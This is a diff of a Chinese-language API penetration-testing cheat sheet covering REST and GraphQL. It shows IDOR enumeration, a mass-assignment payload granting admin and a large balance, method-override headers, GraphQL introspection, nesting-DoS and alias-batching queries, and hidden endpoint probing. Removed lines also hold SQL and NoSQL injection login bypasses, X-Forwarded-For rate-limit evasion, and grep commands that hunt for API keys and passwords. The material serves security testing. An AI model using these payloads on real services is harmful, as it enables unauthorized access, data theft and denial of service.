@@ -1,230 +1,52 @@
-# API 安全测试知识点
+# API 安全测试
 
-> REST API / GraphQL / WebSocket 安全测试
-
----
-
-## REST API 常见漏洞
-
-### 1. 未授权访问
-
+## 未授权
 ```http
-# API 未鉴权
-GET /api/users HTTP/1.1
+GET /api/users
 GET /api/admin/users
-GET /api/v1/users/all
-
-# IDOR (Insecure Direct Object Reference)
-GET /api/users/1
-GET /api/users/2     # 尝试遍历
+GET /api/v1/users/1  → /api/v1/users/2 (IDOR)
 ```
 
-### 2. API 参数注入
-
-```http
-# SQL 注入
-GET /api/users?id=1 UNION SELECT * FROM admin
-
-# NoSQL 注入（MongoDB）
-POST /api/login
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-
-# 参数污染
-GET /api/user?id=1&id=2&id=3
-```
-
-### 3. 批量分配（Mass Assignment）
-
+## Mass Assignment
 ```json
-// 注册时提交额外字段
 POST /api/register
-{
-  "username": "test",
-  "password": "123456",
-  "role": "admin",         // 越权字段
-  "is_admin": true,        // 布尔越权
-  "balance": 999999        // 金额修改
-}
+{"username":"test","password":"123456","role":"admin","balance":999999}
 ```
 
-### 4. 速率限制绕过
-
+## HTTP 方法滥用
 ```http
-# 爆破绕过方法
-X-Forwarded-For: 127.0.0.1
-X-Forwarded-For: 192.168.1.1  # 每次请求换IP
-
-# 使用不同的 Accept 头
-Accept: application/json
-Accept: application/xml
-Accept: text/plain
-```
-
-### 5. HTTP 方法滥用
-
-```http
-# 尝试不同 HTTP 方法
 PUT /api/users/1
 DELETE /api/users/1
 PATCH /api/users/1
-OPTIONS /api/users/1
-
-# Method Override 头
-X-HTTP-Method: DELETE
 X-HTTP-Method-Override: DELETE
-X-Method-Override: DELETE
 ```
 
----
-
-## API 密钥/Token 泄露
-
-### 常见泄露位置
-
-```bash
-# 移动端 APK
-apktool d app.apk
-grep -r "api_key" ./app/
-
-# JavaScript 源码
-grep -r "apiKey" ./js/
-grep -r "token" ./js/
-grep -r "api.*secret" ./js/
-
-# Git 仓库
-git log -p | grep "api_key"
-git log -p | grep "password"
-
-# 环境变量/配置文件
-.env
-config.js
-config.json
-appsettings.json
-```
-
----
-
-## GraphQL 安全
-
-### 1. 信息泄露
-
+## GraphQL
 ```graphql
-# 内省查询（Introspection）— 获取所有类型定义
-query {
-  __schema {
-    types {
-      name
-      fields {
-        name
-        type {
-          name
-        }
-      }
-    }
-  }
-}
+# introspection 获取所有类型
+query{__schema{types{name fields{name}}}}
 
-# 查看所有查询
-query {
-  __schema {
-    queryType {
-      fields {
-        name
-        description
-      }
-    }
-  }
-}
+# 深度嵌套 DoS
+query{user(id:1){posts{comments{user{name}}}}}
+
+# 别名批量查询
+query{u1:user(id:1){name}u2:user(id:2){name}}
 ```
 
-### 2. 批量查询/深度递归（DoS）
-
-```graphql
-# 深度嵌套 — 耗尽服务器资源
-query {
-  user(id: 1) {
-    posts {
-      comments {
-        user {
-          posts {
-            comments {
-              user {
-                name
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-
-# 别名批量查询（绕过速率限制）
-query {
-  u1: user(id: 1) { name email }
-  u2: user(id: 2) { name email }
-  u3: user(id: 3) { name email }
-  # ... 大量别名
-}
-```
-
-### 3. GraphQL 注入
-
-```graphql
-# SQL/NoSQL 注入
-mutation {
-  login(username: "admin' OR 1=1--", password: "test") {
-    token
-  }
-}
-```
-
-### 常用工具
+## API 版本探测
 ```bash
-# graphqlmap — 自动化测试
-python3 graphqlmap.py -u http://target.com/graphql
-
-# InQL (Burp 插件)
-# 从 introspection 生成所有查询
+/api/v1/users  /api/v2/users  /api/internal/users
+/api/swagger.json  /api/docs  /api/openapi.json
+/v2/api-docs  /swagger-ui.html
 ```
 
----
-
-## 多版本 API 攻击
-
-```bash
-# 寻找隐藏版本
-GET /api/v1/users
-GET /api/v2/users
-GET /api/v3/users
-GET /api/internal/users
-GET /api/private/users
-GET /api/dev/users
-GET /api/old/users
-
-# Swagger/OpenAPI 文档
-GET /api/swagger.json
-GET /api/swagger-ui.html
-GET /api/docs
-GET /api/openapi.json
-GET /v2/api-docs
-```
-
----
-
-## API 安全测试清单
-
-| 检查项 | 说明 |
-|--------|------|
-| ⬜ 未授权 API | 未登录即可访问的接口 |
-| ⬜ IDOR | 遍历 ID 访问他人数据 |
-| ⬜ 参数注入 | SQL/NoSQL/命令注入 |
-| ⬜ 批量分配 | 提交额外字段 |
-| ⬜ 速率限制 | 无限制爆破 |
-| ⬜ HTTP 方法乱用 | PUT/DELETE 等 |
-| ⬜ 敏感信息泄露 | API Key、Token |
-| ⬜ CORS 配置错误 | `Access-Control-Allow-Origin: *` |
-| ⬜ Content-Type 混淆 | JSON→XML 改变行为 |
-| ⬜ GraphQL 内省 | 未禁止 introspection |
-| ⬜ 分页越权 | 修改 limit/offset |
-| ⬜ 文件上传 | 上传任意文件 |
+## 检测清单
+- [ ] 未授权 API 接口
+- [ ] IDOR（遍历 ID）
+- [ ] 参数注入（SQL/NoSQL/命令）
+- [ ] Mass Assignment
+- [ ] 速率限制
+- [ ] HTTP 方法滥用
+- [ ] CORS 配置错误
+- [ ] GraphQL introspection
+- [ ] API Key 泄露
